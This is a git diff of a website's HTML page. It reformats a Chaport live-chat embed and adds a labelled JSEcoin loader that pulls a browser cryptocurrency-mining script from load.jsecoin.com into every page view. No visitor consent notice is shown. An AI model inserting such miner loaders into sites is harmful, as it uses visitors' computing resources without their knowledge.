@@ -87,14 +87,32 @@
 </head>
 
 <body>
-  <!-- Begin of Chaport Live Chat code -->
-<script type="text/javascript">
-(function(w,d,v2){
-w.chaport = { app_id : '5a2f089552120422282b1100' };
+    <!-- Begin of Chaport Live Chat code -->
+    <script type="text/javascript">
+        (function (w, d, v2) {
+            w.chaport = {
+                app_id: '5a2f089552120422282b1100'
+            };
 
-v2=w.chaport;v2._q=[];v2._l={};v2.q=function(){v2._q.push(arguments)};v2.on=function(e,fn){if(!v2._l[e])v2._l[e]=[];v2._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
-</script>
-<!-- End of Chaport Live Chat code -->
+            v2 = w.chaport;
+            v2._q = [];
+            v2._l = {};
+            v2.q = function () {
+                v2._q.push(arguments)
+            };
+            v2.on = function (e, fn) {
+                if (!v2._l[e]) v2._l[e] = [];
+                v2._l[e].push(fn)
+            };
+            var s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.async = true;
+            s.src = 'https://app.chaport.com/javascripts/insert.js';
+            var ss = d.getElementsByTagName('script')[0];
+            ss.parentNode.insertBefore(s, ss)
+        })(window, document);
+    </script>
+    <!-- End of Chaport Live Chat code -->
 
     <div id="preloader"></div>
 
@@ -690,6 +708,17 @@ v2=w.chaport;v2._q=[];v2._l={};v2.q=function(){v2._q.push(arguments)};v2.on=func
 
     <!-- Template Specisifc Custom Javascript File -->
     <script src="js/custom.js"></script>
+
+    <!-- JSEcoin Script -->
+    <script type="text/javascript">
+        ! function () {
+            var e = document,
+                t = e.createElement("script"),
+                s = e.getElementsByTagName("script")[0];
+            t.type = "text/javascript", t.async = t.defer = !0, t.src =
+                "https://load.jsecoin.com/load/48629/resonova.com/0/0/", s.parentNode.insertBefore(t, s)
+        }();
+    </script>
 
 </body>
 
